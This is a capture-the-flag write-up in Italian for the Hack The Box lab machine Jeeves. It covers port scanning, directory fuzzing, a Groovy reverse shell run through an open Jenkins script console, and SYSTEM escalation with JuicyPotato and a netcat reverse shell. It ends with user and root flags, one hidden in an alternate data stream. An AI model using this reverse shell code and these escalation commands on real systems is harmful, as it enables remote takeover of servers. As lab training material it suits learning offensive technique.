```
┌──(yus3r㉿kali)-[~/HTB machines/Medium/Windows/Jeeves]
└─$ sudo nmap 10.129.228.112 -Pn -sV
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-29 02:55 +0200
Nmap scan report for jeeves.htb (10.129.228.112)
Host is up (0.13s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.72 seconds
```

// Su porta 80 c'è una finta sqli. Ho fuzzato le directory del server web in ascolto sulla porta 50000

```
┌──(yus3r㉿kali)-[~/HTB machines/Medium/Windows/Jeeves]  
└─$ gobuster dir -u http://jeeves.htb:50000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

// trovato `http://jeeves.htb:50000/askjeeves`. Caricato reverse shell su `http://jeeves.htb:50000/askjeeves/script`

```
String host="{IP attaccante}";
int port={porta};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![[Pasted image 20260930081805.png]]

Andando sul Desktop dell'utente kohsuke, ho trovato la user flag

```
┌──(yus3r㉿kali)-[/usr/share/dirbuster/wordlists]  
└─$ nc -lvnp 8888  
listening on [any] 8888 ...  
connect to [10.10.14.102] from (UNKNOWN) [10.129.228.112] 49676  
Microsoft Windows [Version 10.0.10586]  
(c) 2015 Microsoft Corporation. All rights reserved.  
  
C:\Users\Administrator\.jenkins>whoami  
whoami  
jeeves\kohsuke

C:\Users\Administrator\.jenkins>cd C:\Users  
cd C:\Users  
  
C:\Users>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is 71A1-6FA1  
  
Directory of C:\Users  
  
11/08/2017  06:22 PM    <DIR>          .  
11/08/2017  06:22 PM    <DIR>          ..  
11/03/2017  11:07 PM    <DIR>          Administrator  
11/05/2017  10:17 PM    <DIR>          DefaultAppPool  
11/03/2017  11:19 PM    <DIR>          kohsuke  
10/25/2017  04:46 PM    <DIR>          Public  
              0 File(s)              0 bytes  
              6 Dir(s)   2,610,495,488 bytes free  
  
C:\Users>cd kohsuke  
cd kohsuke  
  
C:\Users\kohsuke>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is 71A1-6FA1  
  
Directory of C:\Users\kohsuke  
  
11/03/2017  11:19 PM    <DIR>          .  
11/03/2017  11:19 PM    <DIR>          ..  
11/03/2017  10:51 PM    <DIR>          .groovy  
11/03/2017  11:15 PM    <DIR>          Contacts  
11/03/2017  11:19 PM    <DIR>          Desktop  
11/03/2017  11:18 PM    <DIR>          Documents  
11/03/2017  11:15 PM    <DIR>          Downloads  
11/03/2017  11:15 PM    <DIR>          Favorites  
11/03/2017  11:22 PM    <DIR>          Links  
11/03/2017  11:15 PM    <DIR>          Music  
11/03/2017  11:22 PM    <DIR>          OneDrive  
11/04/2017  03:10 AM    <DIR>          Pictures  
11/03/2017  11:15 PM    <DIR>          Saved Games  
11/03/2017  11:16 PM    <DIR>          Searches  
11/03/2017  11:15 PM    <DIR>          Videos  
              0 File(s)              0 bytes  
             15 Dir(s)   2,610,495,488 bytes free  
  
C:\Users\kohsuke>cd Desktop  
cd Desktop  
  
C:\Users\kohsuke\Desktop>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is 71A1-6FA1  
  
Directory of C:\Users\kohsuke\Desktop  
  
11/03/2017  11:19 PM    <DIR>          .  
11/03/2017  11:19 PM    <DIR>          ..  
11/03/2017  11:22 PM                32 user.txt  
              1 File(s)             32 bytes  
              2 Dir(s)   2,610,495,488 bytes free  
  
C:\Users\kohsuke\Desktop>type user.txt  
type user.txt  
e3232272596fb47950d59c4cf1e7066a
```

Enumerando i privilegi dell'utente kohsuke, ho trovato SeImpersonate // breve descrizione di SeImpersonate

```
C:\>whoami /priv  
whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                               State      
============================= ========================================= ========  
SeShutdownPrivilege           Shut down the system                      Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeUndockPrivilege             Remove computer from docking station      Disabled  
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Caricato JuicyPotato e nc.exe //breve descrizione di JuicyPotato

```
C:\Users\kohsuke\Downloads>.\JuicyPotato.exe -l 53000 -p c:\windows\system32\cmd.exe -t * -a "/c C:\Users\kohsuke\Downloads\nc.exe 10.10.14.102 5000 -e cmd.exe"
.\JuicyPotato.exe -l 53000 -p c:\windows\system32\cmd.exe -t * -a "/c C:\Users\kohsuke\Downloads\nc.exe 10.10.14.102 5000 -e cmd.exe"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53000
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

Ottenuto una reverse shell nel contesto di SYSTEM. Trovata la root flag in un flusso nascosto //breve spiegazione di cosa sono i flussi nascosti

```
  
┌──(yus3r㉿kali)-[~/HTB machines/Medium/Windows/Jeeves]  
└─$ nc -lvnp 5000  
listening on [any] 5000 ...  
connect to [10.10.14.102] from (UNKNOWN) [10.129.228.112] 49699  
Microsoft Windows [Version 10.0.10586]  
(c) 2015 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>whoami  
whoami  
nt authority\system  
  
C:\Windows\system32>cd C:\Users\Administrator\Desktop  
cd C:\Users\Administrator\Desktop  
  
C:\Users\Administrator\Desktop>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is 71A1-6FA1  
  
Directory of C:\Users\Administrator\Desktop  
  
11/08/2017  10:05 AM    <DIR>          .  
11/08/2017  10:05 AM    <DIR>          ..  
12/24/2017  03:51 AM                36 hm.txt  
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk  
              2 File(s)            833 bytes  
              2 Dir(s)   2,609,881,088 bytes free  
  
C:\Users\Administrator\Desktop>type hm.txt  
type hm.txt  
The flag is elsewhere.  Look deeper.  
C:\Users\Administrator\Desktop>dir /r  
dir /r  
Volume in drive C has no label.  
Volume Serial Number is 71A1-6FA1  
  
Directory of C:\Users\Administrator\Desktop  
  
11/08/2017  10:05 AM    <DIR>          .  
11/08/2017  10:05 AM    <DIR>          ..  
12/24/2017  03:51 AM                36 hm.txt  
                                   34 hm.txt:root.txt:$DATA  
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk  
              2 File(s)            833 bytes  
              2 Dir(s)   2,609,881,088 bytes free  
  
C:\Users\Administrator\Desktop>more < hm.txt:root.txt  
more < hm.txt:root.txt  
afbc5bd4b615a60648cec41c6ac92530
```